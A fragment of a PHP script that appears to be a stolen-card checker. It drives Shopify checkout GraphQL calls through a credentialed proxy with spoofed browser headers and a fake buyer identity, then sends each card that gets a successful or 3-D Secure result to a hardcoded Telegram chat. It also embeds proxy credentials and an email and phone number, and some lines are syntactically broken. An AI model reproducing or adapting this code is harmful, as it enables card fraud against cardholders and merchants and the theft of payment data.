                    'Status' => 'true',
                    'Price'=> $minPrice,
                ]);
                echo $result;
                exit;
            }
        }
    $currencycode = $firstStrategy->tax->totalTaxAmount->value->currencyCode;
    $totalamt = $firstStrategy->runningTotal->value->amount;
    $isShipping = $decoded->data->session->negotiate->result->buyerProposal->delivery->deliveryLines[0]->deliveryMethodTypes[0];
    recipt:
if ($deliverymethodtype == 'NONE') {
    $postf = json_encode([
        'query' => 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:Analyt[...]
                'variables' => [
                    'input' => [
                        'sessionInput' => [
                            'sessionToken' => $x_checkout_one_session_token
                        ],
                        'queueToken' => $queue_token,
                        'discounts' => [
                            'lines' => [],
                            'acceptUnexpectedDiscounts' => true
                        ],
                        'delivery' => [
                            'deliveryLines' => [
                                [
                                    'selectedDeliveryStrategy' => [
                                        'deliveryStrategyMatchingConditions' => [
                                            'estimatedTimeInTransit' => [
                                                'any' => true
                                            ],
                                            'shipments' => [
                                                'any' => true
                                            ]
                                        ],
                                        'options' => new stdClass()
                                    ],
                                    'targetMerchandiseLines' => [
                                        'lines' => [
                                            [
                                                'stableId' => $stable_id
                                            ]
                                        ]
                                    ],
                                    'deliveryMethodTypes' => [
                                        'NONE'
                                    ],
                                    'expectedTotalPrice' => [
                                        'any' => true
                                    ],
                                    'destinationChanged' => true
                                ]
                            ],
                            'noDeliveryRequired' => [],
                            'useProgressiveRates' => false,
                            'prefetchShippingRatesStrategy' => null,
                            'supportsSplitShipping' => true
                        ],
                        'deliveryExpectations' => [
                            'deliveryExpectationLines' => []
                        ],
                        'merchandise' => [
                            'merchandiseLines' => [
                                [
                                    'stableId' => $stable_id,
                                    'merchandise' => [
                                        'productVariantReference' => [
                                            'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                            'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                            'properties' => [],
                                            'sellingPlanId' => null,
                                            'sellingPlanDigest' => null
                                        ]
                                    ],
                                    'quantity' => [
                                        'items' => [
                                            'value' => 1
                                        ]
                                    ],
                                    'expectedTotalPrice' => [
                                        'value' => [
                                            'amount' => $minPrice,
                                            'currencyCode' => $address['currency']
                                        ]
                                    ],
                                    'lineComponentsSource' => null,
                                    'lineComponents' => []
                                ]
                            ]
                        ],
                        'payment' => [
                            'totalAmount' => [
                                'any' => true
                            ],
                            'paymentLines' => [
                                [
                                    'paymentMethod' => [
                                        'directPaymentMethod' => [
                                            'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                            'sessionId' => $cctoken,
                                            'billingAddress' => [
                                                'streetAddress' => [
                                                    'address1' => $address['street'],
                                                    'address2' => '',
                                                    'city' => $address['city'],
                                                    'countryCode' => $address['country'],
                                                    'postalCode' => $address['postcode'],
                                                    'firstName' => 'garry',
                                                    'lastName' => 'xd',
                                                    'zoneCode' => $address['state'],
                                                    'phone' => '+18103646394'
                                                ]
                                            ],
                                            'cardSource' => null
                                        ],
                                        'giftCardPaymentMethod' => null,
                                        'redeemablePaymentMethod' => null,
                                        'walletPaymentMethod' => null,
                                        'walletsPlatformPaymentMethod' => null,
                                        'localPaymentMethod' => null,
                                        'paymentOnDeliveryMethod' => null,
                                        'paymentOnDeliveryMethod2' => null,
                                        'manualPaymentMethod' => null,
                                        'customPaymentMethod' => null,
                                        'offsitePaymentMethod' => null,
                                        'customOnsitePaymentMethod' => null,
                                        'deferredPaymentMethod' => null,
                                        'customerCreditCardPaymentMethod' => null,
                                        'paypalBillingAgreementPaymentMethod' => null
                                    ],
                                    'amount' => [
                                        'value' => [
                                            'amount' => $totalamt,
                                            'currencyCode' => $address['currency']
                                        ]
                                    ],
                                    'dueAt' => null
                                ]
                            ],
                            'billingAddress' => [
                                'streetAddress' => [
                                    'address1' => $address['street'],
                                    'address2' => '',
                                    'city' => $address['city'],
                                    'countryCode' => $address['country'],
                                    'postalCode' => $address['postcode'],
                                    'firstName' => 'garry',
                                    'lastName' => 'xd',
                                    'zoneCode' => $address['state'],
                                    'phone' => ''
                                ]
                            ]
                        ],
                        'buyerIdentity' => [
                            'customer' => [
                                'presentmentCurrency' => $address['currency'],
                                'countryCode' => $address['country']
                            ],
                            'email' => 'sidhumehak572@gmail.com',
                            'emailChanged' => false,
                            'phoneCountryCode' => $address['country'],
                            'marketingConsent' => [],
                            'shopPayOptInPhone' => [
                                'countryCode' => $address['country']
                            ],
                            'rememberMe' => false
                        ],
                        'tip' => [
                            'tipLines' => []
                        ],
                        'taxes' => [
                            'proposedAllocations' => null,
                            'proposedTotalAmount' => [
                                'value' => [
                                    'amount' => $tax,
                                    'currencyCode' => $address['currency']
                                ]
                            ],
                            'proposedTotalIncludedAmount' => null,
                            'proposedMixedStateTotalAmount' => null,
                            'proposedExemptions' => []
                        ],
                        'note' => [
                            'message' => null,
                            'customAttributes' => []
                        ],
                        'localizationExtension' => [
                            'fields' => []
                        ],
                        'nonNegotiableTerms' => null,
                        'scriptFingerprint' => [
                            'signature' => null,
                            'signatureUuid' => null,
                            'lineItemScriptChanges' => [],
                            'paymentScriptChanges' => [],
                            'shippingScriptChanges' => []
                        ],
                        'optionalDuties' => [
                            'buyerRefusesDuties' => false
                        ]
                    ],
                    'attemptToken' => $checkoutToken,
                    'metafields' => [],
                    'analytics' => [
                        'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                        'pageId' => $stable_id
                    ]
                ],
                'operationName' => 'SubmitForCompletion'
            ]);
}
elseif ($isShipping == 'SHIPPING') {
    $postf = json_encode([
        'query' => 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:Analyt[...]
            'variables' => [
                'input' => [
                    'sessionInput' => [
                        'sessionToken' => $x_checkout_one_session_token
                    ],
                    'queueToken' => $queue_token,
                    'discounts' => [
                        'lines' => [],
                        'acceptUnexpectedDiscounts' => true
                    ],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => $address['street'],
                                        'address2' => '',
                                        'city' => $address['city'],
                                        'countryCode' => $address['country'],
                                        'postalCode' => $address['postcode'],
                                        'firstName' => 'garry',
                                        'lastName' => 'xd',
                                        'zoneCode' => $address['state'],
                                        'phone' => '+18103646394',
                                        'oneTimeUse' => false,
                                        'coordinates' => [
                                        'latitude' => $latitude,
                                        'longitude' => $longitude
                                    ]
                                    ]
                                ],
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyByHandle' => [
                                        'handle' => $handle,
                                        'customDeliveryRate' => false
                                    ],
                                    'options' => new stdClass()
                                ],
                                'targetMerchandiseLines' => [
                                    'lines' => [
                                        [
                                            'stableId' => $stable_id
                                        ]
                                    ]
                                ],
                                'deliveryMethodTypes' => [
                                    'SHIPPING'
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $delamount,
                                        'currencyCode' => $address['currency']
                                    ]
                                ],
                                'destinationChanged' => false
                            ]
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                        'prefetchShippingRatesStrategy' => null,
                        'supportsSplitShipping' => true
                    ],
                    'deliveryExpectations' => [
                        'deliveryExpectationLines' => []
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => 'gid://shopify/ProductVariantMerchandise/' . $prodid,
                                        'variantId' => 'gid://shopify/ProductVariant/' . $prodid,
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null
                                    ]
                                ],
                                'quantity' => [
                                    'items' => [
                                        'value' => 1
                                    ]
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => $minPrice,
                                        'currencyCode' => $address['currency']
                                    ]
                                ],
                                'lineComponentsSource' => null,
                                'lineComponents' => []
                            ]
                        ]
                    ],
                    'payment' => [
                        'totalAmount' => [
                            'any' => true
                        ],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                        'sessionId' => $cctoken,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => $address['street'],
                                                'address2' => '',
                                                'city' => $address['city'],
                                                'countryCode' => $address['country'],
                                                'postalCode' => $address['postcode'],
                                                'firstName' => 'garry',
                                                'lastName' => 'xd',
                                                'zoneCode' => $address['state'],
                                                'phone' => '+18103646394'
                                            ]
                                        ],
                                        'cardSource' => null
                                    ],
                                    'giftCardPaymentMethod' => null,
                                    'redeemablePaymentMethod' => null,
                                    'walletPaymentMethod' => null,
                                    'walletsPlatformPaymentMethod' => null,
                                    'localPaymentMethod' => null,
                                    'paymentOnDeliveryMethod' => null,
                                    'paymentOnDeliveryMethod2' => null,
                                    'manualPaymentMethod' => null,
                                    'customPaymentMethod' => null,
                                    'offsitePaymentMethod' => null,
                                    'customOnsitePaymentMethod' => null,
                                    'deferredPaymentMethod' => null,
                                    'customerCreditCardPaymentMethod' => null,
                                    'paypalBillingAgreementPaymentMethod' => null
                                ],
                                'amount' => [
                                    'value' => [
                                        'amount' => $totalamt,
                                        'currencyCode' => $address['currency']
                                    ]
                                ],
                                'dueAt' => null
                            ]
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => $address['street'],
                                'address2' => '',
                                'city' => $address['city'],
                                'countryCode' => $address['country'],
                                'postalCode' => $address['postcode'],
                                'firstName' => 'garry',
                                'lastName' => 'xd',
                                'zoneCode' => $address['state'],
                                'phone' => '+18103646394'
                            ]
                        ]
                    ],
                    'buyerIdentity' => [
                        'customer' => [
                            'presentmentCurrency' => $address['currency'],
                            'countryCode' => $address['country']
                        ],
                        'email' => 'sidhumehak572@gmail.com',
                        'emailChanged' => false,
                        'phoneCountryCode' => $address['country'],
                        'marketingConsent' => [],
                        'shopPayOptInPhone' => [
                            'countryCode' => $address['country']
                        ]
                    ],
                    'tip' => [
                        'tipLines' => []
                    ],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => [
                            'value' => [
                                'amount' => $tax,
                                'currencyCode' => $address['currency']
                            ]
                        ],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => []
                    ],
                    'note' => [
                        'message' => null,
                        'customAttributes' => []
                    ],
                    'localizationExtension' => [
                        'fields' => []
                    ],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => []
                    ],
                    'optionalDuties' => [
                        'buyerRefusesDuties' => false
                    ]
                ],
                'attemptToken' => ''.$checkoutToken.'-0a6d87fj9zmj',
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                    'pageId' => $stable_id
                ]
            ],
            'operationName' => 'SubmitForCompletion'
        ]);    
} else {
    $err = 'Declined';
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price'=> $totalamt,
        'Gateway' => $gateway,
    ]);
    echo $result;
    curl_close($ch);
    exit;
}
    // $totalamt = $firstStrategy->runningTotal->value->amount;
sleep(0.5);
    $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=SubmitForCompletion');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: application/json',
    'accept-language: en-US',
    'content-type: application/json',
    'origin: '.$urlbase,
    'priority: u=1, i',
    'referer: '.$urlbase.'/',
    'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-origin',
    'user-agent: '.$ua,
    'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
    'x-checkout-web-deploy-stage: production',
    'x-checkout-web-server-handling: fast',
    'x-checkout-web-server-rendering: no',
    'x-checkout-web-source-id: ' . $checkoutToken,
]);
curl_setopt($ch, CURLOPT_PROXY, 'gw.dataimpulse.com:823');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, '76ae20ff1afab170727e:53d778d7bde5d0d0');
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);

$response4 = curl_exec($ch);
if (curl_errno($ch)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt; 
    } else {
        $err = 'cURL error: ' . curl_error($ch);
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $totalamt,
            'Gateway' => $gateway,
        ]);
        echo $result;
        curl_close($ch);
        exit;
    }
}
if (strpos($response4, '"errors":[{"code":"CAPTCHA_METADATA_MISSING"')) {
    $err = "HCAPTCHA DETECTED";
    $result = json_encode([
        'Response' => $err,
        'Status' => 'false',
        'Price'=> $totalamt,
        'Gateway' => $gateway,
    ]);
    echo $result;
    curl_close($ch);
    exit;
}

$response4js = json_decode($response4); 

if (isset($response4js->data->submitForCompletion->receipt->id)) {
    $recipt_id = $response4js->data->submitForCompletion->receipt->id;
} elseif (empty($recipt_id)) {
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto recipt;
    } else {
        $err = 'Declined';
        $result = json_encode([
            'Response' => $err,
            'Status' => 'true',
            'Price'=> $totalamt,
            'Gateway' => $gateway,
        ]);
        echo $result;
        curl_close($ch);
        exit;
    }
}



poll:
$postf2 = json_encode([
    'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails[...]
    'variables' => [
        'receiptId' => $recipt_id,
        'sessionToken' => $x_checkout_one_session_token
    ],
    'operationName' => 'PollForReceipt'

]);
sleep(0.5);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
'accept: application/json',
'accept-language: en-US',
'content-type: application/json',
'origin: '.$urlbase,
'priority: u=1, i',
'referer: '.$urlbase,
'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: '.$ua,
'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
'x-checkout-web-build-id: ' . $web_build_id,
'x-checkout-web-deploy-stage: production,
'x-checkout-web-server-handling: fast',
'x-checkout-web-server-rendering: no',
'x-checkout-web-source-id: ' . $checkoutToken,
]);
curl_setopt($ch, CURLOPT_PROXY, 'gw.dataimpulse.com:823');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, '76ae20ff1afab170727e:53d778d7bde5d0d0');
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);

$response5 = curl_exec($ch);
if (curl_errno($ch)) {
    curl_close($ch);
    if ($retryCount < $maxRetries) {
        $retryCount++;
        goto poll; 
    } else {
    $err = 'cURL error: ' . curl_error($ch);
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price'=> $totalamt,
        'Gateway' => $gateway,
    ]);
    echo $result;
    exit;
}
}

$r5js = (json_decode($response5));
if (
    strpos($response5, $checkouturl . '/thank_you') ||
    strpos($response5, $checkouturl . '/post_purchase') ||
    strpos($response5, 'Your order is confirmed') ||
    strpos($response5, 'Thank you') ||
    strpos($response5, 'ThankYou') ||
    strpos($response5, 'thank_you') ||
    strpos($response5, 'success') ||
    strpos($response5, 'classicThankYouPageUrl') ||
    strpos($response5, '"__typename":"ProcessedReceipt"') ||
    strpos($response5, 'SUCCESS')
) {
    $err = 'Thank You ' . $totalamt;
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
    ]);
    $kb_s = [
        'caption' => "
Card: $cc1
Response: $err
Gateway: $gateway
Price: $totalamt
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "Dev",
                        'url' => 'https://t.me/batchecker'
                    ]
                ]
            ]
        ])
    ];
    $chat_id1 = '';
    output('sendVideo', array_merge([
        'chat_id' => '7675426356',
        'video' => 'https://t.me/okdiiecc/5'
    ], $kb_s));
    echo $result;
    exit;
} elseif (strpos($response5, 'CompletePaymentChallenge')) {
    $err = '3D_AUTHENTICATION';
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
    ]);
    $kb_s = [
        'caption' => "
Card: $cc1
Response: $err
Gateway: $gateway
Price: $totalamt
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "Dev",
                        'url' => 'https://t.me/batchecker'
                    ]
                ]
            ]
        ])
    ];
    output('sendVideo', array_merge([
        'chat_id' => '7675426356',
        'video' => 'https://t.me/okdiiecc/5'
    ], $kb_s));
    echo $result;
    exit;
} elseif (strpos($response5, '/stripe/authentications/')) {
    $err = '3D_AUTHENTICATION';
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
    ]);
    $kb_s = [
        'caption' => "
Card: $cc1
Response: $err
Gateway: $gateway
Price: $totalamt
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "Dev",
                        'url' => 'https://t.me/batchecker'
                    ]
                ]
            ]
        ])
    ];
    output('sendVideo', array_merge([
        'chat_id' => '7675426356',
        'video' => 'https://t.me/okdiiecc/5'
    ], $kb_s));
    echo $result;
    exit;
}
 elseif (isset($r5js->data->receipt->processingError->code)) {
    $err = $r5js->data->receipt->processingError->code;
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
    ]);
    echo $result;
    exit;
} elseif (strpos($response5, '"__typename":"WaitingReceipt"' || '"__typename":"ProcessingReceipt"')) {
    sleep(5);
    goto poll;
} else
 {
    $err = 'Thank You ' . $totalamt;
    $result = json_encode([
        'Response' => $err,
        'Status' => 'true',
        'Price' => $totalamt,
        'Gateway' => $gateway,
        'cc' => $cc1,
    ]);
    $kb_s = [
        'caption' => "
Card: $cc1
Response: $err
Gateway: $gateway
Price: $totalamt
        ",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    [
                        'text' => "Dev",
                        'url' => 'https://t.me/batchecker'
                    ]
                ]
            ]
        ])
    ];
    output('sendVideo', array_merge([
        'chat_id' => '7675426356',
        'video' => 'https://t.me/okdiiecc/5'
    ], $kb_s));
    echo $result;
    // echo $response5;
    exit;
}

